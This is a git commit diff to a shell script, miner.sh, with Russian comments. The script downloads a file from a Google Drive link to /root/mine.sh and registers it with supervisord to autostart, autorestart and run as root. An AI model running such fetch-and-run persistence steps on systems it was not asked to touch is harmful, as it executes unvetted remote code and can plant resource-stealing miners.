a71d54b5d0a079e7fd7498aea43a95170972f302
3aKo-Jin <156850291+3aKo-Jin@users.noreply.github.com>
2025-01-20 23:03:49 +0300

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -5,17 +5,18 @@ cd ~
 wget "https://drive.google.com/uc?export=download&id=1dhSfgivVbym0jHSdhxo0D0XGb_OW4EVB" -O /root/mine.sh
 chmod +x /root/mine.sh
 
-# Запускаем наш сохраненный скрипт
-/root/mine.sh >> /root/miner.log 2>&1
 
+if [ ! -f /etc/supervisor/conf.d/delegated_entrypoint.conf ]; then
 # Настройка логирования supervisord через перенаправление stdout и stderr в файлы:
 echo "[program:delegated_entrypoint]" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
 echo "command=/root/mine.sh" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
 echo "directory=/root" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
 echo "autostart=true" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
 echo "autorestart=true" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+echo "startsecs=10" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
 echo "stdout_logfile=/var/log/delegated_entrypoint.log" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
 echo "stderr_logfile=/var/log/delegated_entrypoint_err.log" >> /etc/supervisor/conf.d/delegated_entrypoint.conf
+fi
 
-# Перезапускаем supervisord для применения изменений
-supervisorctl restart delegated_entrypoint
+# Запускаем наш сохраненный скрипт
+exec /root/mine.sh >> /root/miner.log 2>&1
